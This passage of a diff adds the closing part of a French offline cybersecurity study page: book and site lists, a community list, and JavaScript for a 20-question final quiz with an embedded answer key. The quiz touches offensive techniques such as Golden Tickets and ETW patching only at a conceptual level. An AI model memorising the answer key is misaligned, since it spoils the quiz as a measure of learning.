+    <tr><td>OSEP / OSED</td><td>Évasion EDR / exploit dev</td><td>Avancé</td></tr>
+    <tr><td>GIAC (GCFA, GREM, GCFR)</td><td>DFIR, reverse</td><td>Avancé, cher</td></tr>
+  </table>
+</section>
+
+<section id="ressources">
+  <h2>13 — Ressources</h2>
+
+  <h3>Livres</h3>
+  <div class="grid2">
+    <div class="card">
+      <h4>Fondamentaux</h4>
+      <ul>
+        <li><i>Computer Networks</i> — Tanenbaum</li>
+        <li><i>The Linux Command Line</i> — Shotts (gratuit en PDF)</li>
+        <li><i>Cryptography Engineering</i> — Ferguson, Schneier, Kohno</li>
+        <li><i>Serious Cryptography</i> — Aumasson</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>Offensif</h4>
+      <ul>
+        <li><i>The Web Application Hacker's Handbook</i> — Stuttard, Pinto</li>
+        <li><i>Red Team Field Manual (RTFM)</i>, <i>BTFM</i></li>
+        <li><i>The Hacker Playbook 3</i> — Kim</li>
+        <li><i>Attacking Network Protocols</i> — Forshaw</li>
+        <li><i>Penetration Testing</i> — Weidman</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>Reverse / exploit</h4>
+      <ul>
+        <li><i>Practical Malware Analysis</i> — Sikorski, Honig</li>
+        <li><i>The Art of Memory Forensics</i> — Ligh et al.</li>
+        <li><i>Hacking: The Art of Exploitation</i> — Erickson</li>
+        <li><i>Windows Internals, Part 1&amp;2</i> — Russinovich et al.</li>
+        <li><i>Rootkits and Bootkits</i> — Matrosov et al.</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>Défensif / architecture</h4>
+      <ul>
+        <li><i>Blue Team Handbook: Incident Response</i> — Murdoch</li>
+        <li><i>Intelligence-Driven Incident Response</i> — Roberts, Brown</li>
+        <li><i>Security Engineering</i> — Anderson (gratuit sur son site)</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Chaînes et podcasts</h3>
+  <ul>
+    <li><b>YouTube</b> : IppSec (walkthroughs HTB), John Hammond, LiveOverflow, Gynvael Coldwind, 13Cubed, SANS DFIR, Hak5</li>
+    <li><b>Podcasts</b> : Darknet Diaries, Risky Business, SANS Internet Storm Center StormCast, Malicious Life</li>
+    <li><b>FR</b> : Hackademics, Processus Thief, le NoLimitSecu</li>
+  </ul>
+
+  <h3>Sites &amp; références</h3>
+  <ul>
+    <li><a href="https://attack.mitre.org" target="_blank">MITRE ATT&amp;CK</a> — matrice tactiques/techniques</li>
+    <li><a href="https://owasp.org" target="_blank">OWASP</a> — top 10, cheat sheets, projets</li>
+    <li><a href="https://gtfobins.github.io" target="_blank">GTFOBins</a> / <a href="https://lolbas-project.github.io" target="_blank">LOLBAS</a></li>
+    <li><a href="https://book.hacktricks.wiki" target="_blank">HackTricks</a> — encyclopédie offensive</li>
+    <li><a href="https://www.ired.team" target="_blank">ired.team</a> — notes red team avancées</li>
+    <li><a href="https://malapi.io" target="_blank">MalAPI</a> — API Win32 par catégorie malware</li>
+    <li><a href="https://nvd.nist.gov" target="_blank">NVD</a>, <a href="https://cve.mitre.org" target="_blank">CVE</a>, <a href="https://exploit-db.com" target="_blank">Exploit-DB</a></li>
+    <li><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Academy</a></li>
+    <li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank">CISA KEV</a> — vulns activement exploitées</li>
+  </ul>
+
+  <h3>Communauté</h3>
+  <ul>
+    <li>Discord : TryHackMe, HackTheBox, NahamSec, John Hammond, DFIR</li>
+    <li>Reddit : r/netsec, r/AskNetsec, r/blueteamsec, r/malware</li>
+    <li>Conférences à (re)voir : DEF CON, Black Hat, BSides, Troopers, SSTIC (FR), Nullcon</li>
+  </ul>
+</section>
+
+<section id="quiz">
+  <h2>14 — Quiz final (20 questions)</h2>
+  <p>Score &gt; 16/20 : tu as de solides bases généralistes, va casser des choses sur HTB.</p>
+
+  <div id="finalquiz"></div>
+  <button onclick="scoreFinal()">Calculer mon score</button>
+  <div id="finalscore" style="margin-top:14px;font-family:var(--mono);color:var(--acc)"></div>
+</section>
+
+<footer>
+  CyberLab — fichier unique, offline, apprentissage.
+  Toutes les techniques décrites s'exercent sur tes propres systèmes ou dans un cadre autorisé.
+</footer>
+
+</main>
+</div>
+
+<script>
+// nav routing
+const links = document.querySelectorAll('nav.side a');
+const sections = document.querySelectorAll('main section');
+function show(id){
+  sections.forEach(s=>s.classList.toggle('on', s.id===id));
+  links.forEach(a=>a.classList.toggle('active', a.getAttribute('href')==='#'+id));
+  window.scrollTo({top:0,behavior:'instant'});
+  localStorage.setItem('cl_last', id);
+}
+links.forEach(a=>a.addEventListener('click',e=>{
+  e.preventDefault();
+  show(a.getAttribute('href').slice(1));
+}));
+const last = localStorage.getItem('cl_last');
+if(last && document.getElementById(last)) show(last);
+
+// quiz handling (per-question)
+document.querySelectorAll('.quiz').forEach(q=>{
+  const key = 'cl_q_'+q.dataset.q;
+  const saved = localStorage.getItem(key);
+  q.querySelectorAll('label').forEach(lab=>{
+    const inp = lab.querySelector('input');
+    if(saved && inp.value===saved){
+      inp.checked = true;
+      markQuiz(q);
+    }
+    inp.addEventListener('change',()=>{
+      localStorage.setItem(key, inp.value);
+      markQuiz(q);
+      updateProgress();
+    });
+  });
+});
+function markQuiz(q){
+  const expl = q.querySelector('.expl');
+  q.querySelectorAll('label').forEach(l=>l.classList.remove('ok','ko'));
+  const chosen = q.querySelector('input:checked');
+  if(!chosen) return;
+  const ok = chosen.dataset.ok !== undefined;
+  chosen.parentElement.classList.add(ok?'ok':'ko');
+  if(!ok){
+    q.querySelector('input[data-ok]').parentElement.classList.add('ok');
+  }
+  if(expl) expl.classList.add('on');
+}
+
+// checklist persistence
+document.querySelectorAll('.chk').forEach(ul=>{
+  const key = 'cl_chk_'+ul.dataset.k;
+  const state = JSON.parse(localStorage.getItem(key) || '[]');
+  [...ul.children].forEach((li,i)=>{
+    if(state[i]) li.classList.add('done');
+    li.addEventListener('click',()=>{
+      li.classList.toggle('done');
+      const st = [...ul.children].map(x=>x.classList.contains('done'));
+      localStorage.setItem(key, JSON.stringify(st));
+      updateProgress();
+    });
+  });
+});
+
+// progress bar — count completed quizzes + checklists
+function updateProgress(){
+  const total = document.querySelectorAll('.quiz').length;
+  let done = 0;
+  document.querySelectorAll('.quiz').forEach(q=>{
+    if(q.querySelector('input:checked[data-ok]')) done++;
+  });
+  const pct = total? Math.round(done/total*100):0;
+  document.getElementById('pbar').style.width = pct+'%';
+  document.getElementById('ptxt').textContent = done+' / '+total+' quiz validés ('+pct+'%)';
+}
+updateProgress();
+
+function resetAll(){
+  if(!confirm('Tout réinitialiser (quiz, checklists, progression) ?')) return;
+  Object.keys(localStorage).filter(k=>k.startsWith('cl_')).forEach(k=>localStorage.removeItem(k));
+  location.reload();
+}
+
+// final quiz
+const FINAL = [
+  {q:"Qu'est-ce qu'un IDOR ?",a:["Un chiffrement faible","Un défaut de contrôle d'accès sur un identifiant d'objet","Un header HTTP","Un format de hash"],ok:1},
+  {q:"Mode AES à éviter absolument :",a:["GCM","CBC avec IV aléatoire","ECB","CTR"],ok:2},
+  {q:"Protocole AD visé par le kerberoasting :",a:["LDAP","NTLM","Kerberos","SMB"],ok:2},
+  {q:"Flag TCP qui ferme proprement une connexion :",a:["RST","FIN","PSH","URG"],ok:1},
+  {q:"Outil de craquage de hash GPU :",a:["john","nmap","hashcat","hydra"],ok:2},
+  {q:"Port par défaut RDP :",a:["22","445","3389","5985"],ok:2},
+  {q:"Un stealer vise principalement :",a:["La disponibilité","Les crédentiels et données locales","Le noyau","Le firmware"],ok:1},
+  {q:"Mitigation primaire du XSS :",a:["WAF","Blacklist de mots-clés","Échappement contextuel + CSP","Rate limit"],ok:2},
+  {q:"Volatility sert à :",a:["Scanner un réseau","Analyser une image mémoire","Compiler des exploits","Chiffrer un disque"],ok:1},
+  {q:"Signal d'un process malveillant côté EDR :",a:["winword.exe lance powershell.exe","explorer.exe ouvre un fichier","svchost.exe tourne","chrome.exe fait du HTTPS"],ok:0},
+  {q:"Hash recommandé pour un mot de passe :",a:["MD5","SHA-1","SHA-256 brut","Argon2id"],ok:3},
+  {q:"Une CSP stricte protège contre :",a:["Les injections SQL","Les XSS","Le phishing","Le SSRF"],ok:1},
+  {q:"La reconnaissance DNS 'AXFR' tente :",a:["Un ping","Un transfert de zone","Une résolution inverse","Une attaque DoS"],ok:1},
+  {q:"GTFOBins catalogue :",a:["Les CVE Windows","Des abus de binaires Unix légitimes","Des règles YARA","Des exploits web"],ok:1},
+  {q:"Pass-the-Hash exploite :",a:["Un bug du noyau","Le fait que NTLM accepte un hash comme preuve","Une faille TLS","Un cookie non chiffré"],ok:1},
+  {q:"Le MITRE ATT&amp;CK décrit :",a:["Des CVE","Des produits sécu","Des tactiques et techniques d'adversaires","Des normes ISO"],ok:2},
+  {q:"Pour un bucket S3 public mal configuré, vulnérabilité OWASP :",a:["A01 Broken Access Control","A05 Security Misconfiguration","A10 SSRF","A02 Crypto"],ok:1},
+  {q:"Dans un pentest, l'étape immédiatement après l'exploitation :",a:["Reporting","Post-exploitation","Scope","Reconnaissance"],ok:1},
+  {q:"ETW patching sert à :",a:["Mettre à jour Windows","Masquer les événements de télémétrie","Déchiffrer TLS","Lire LSASS"],ok:1},
+  {q:"Un Golden Ticket est forgé avec le hash de :",a:["Administrateur local","krbtgt","Domain Admin","SYSTEM"],ok:1},
+];
+const fq = document.getElementById('finalquiz');
+FINAL.forEach((item,i)=>{
+  const div = document.createElement('div');
+  div.className = 'quiz';
+  div.innerHTML = '<div class="q">'+(i+1)+'. '+item.q+'</div>' +
+    item.a.map((t,j)=>'<label><input type="radio" name="fq'+i+'" value="'+j+'"> '+t+'</label>').join('');
+  fq.appendChild(div);
+});
+function scoreFinal(){
+  let s = 0;
+  FINAL.forEach((item,i)=>{
+    const sel = document.querySelector('input[name=fq'+i+']:checked');
+    if(sel && parseInt(sel.value)===item.ok) s++;
+  });
+  const out = document.getElementById('finalscore');
+  out.textContent = 'Score : '+s+' / '+FINAL.length +
+    (s>=16 ? ' — solide. Va casser des machines sur HTB.' :
+     s>=10 ? ' — correct. Re-révise les modules faibles.' :
+             ' — reprends depuis le module 01.');
+}
+</script>
+</body>
+</html>
